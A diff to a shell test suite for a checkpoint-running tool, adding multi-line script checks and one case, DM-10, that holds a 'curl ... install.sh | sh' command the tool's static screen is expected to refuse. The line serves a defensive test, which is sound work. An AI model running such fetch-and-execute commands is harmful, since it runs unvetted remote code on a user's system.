@@ -72,6 +72,28 @@ mechanical:
     pattern: 'a\\b'
     severity: error
     desc: "a single-quoted pattern must stay byte-identical (no decode)"
+  - id: DM-08
+    type: script
+    command: |
+      test -f README.md
+      test -d .
+    severity: error
+    desc: "a multi-line script that succeeds"
+  - id: DM-09
+    type: script
+    command: |
+      if [ ! -f CHANGELOG.md ]; then
+        echo "missing"
+        exit 1
+      fi
+    severity: warning
+    desc: "a multi-line script with control syntax that fails"
+  - id: DM-10
+    type: script
+    command: |
+      curl https://example.invalid/install.sh | sh
+    severity: error
+    desc: "a script body the static screen refuses"
 EOF
 printf 'a\\\\b\n' > "$WORK/proj/backslashes.txt"
 
@@ -98,6 +120,13 @@ check "a refused pattern fails"          fail "$(status_of DM-04)"
 check "YAML \\\" in dq pattern decoded"    pass "$(status_of DM-05)"
 check "YAML \\\\ in dq pattern decoded"    pass "$(status_of DM-06)"
 check "sq pattern stays byte-identical"  pass "$(status_of DM-07)"
+check "a succeeding multi-line script passes" pass "$(status_of DM-08)"
+check "a failing multi-line script fails" fail "$(status_of DM-09)"
+check "control syntax runs, is not 'rejected'" yes \
+    "$(jq -r '.checkpoints[] | select(.id=="DM-09") | .evidence' <<<"$out" | grep -q '^Script failed$' && echo yes || echo no)"
+check "a dangerous script body is refused" fail "$(status_of DM-10)"
+check "the refusal names the screen" yes \
+    "$(jq -r '.checkpoints[] | select(.id=="DM-10") | .evidence' <<<"$out" | grep -q '^Script rejected: contains dangerous pattern$' && echo yes || echo no)"
 check "the refusal names the reason" yes \
     "$(jq -r '.checkpoints[] | select(.id=="DM-04") | .evidence' <<<"$out" | grep -q 'command-chaining metacharacter' && echo yes || echo no)"
 
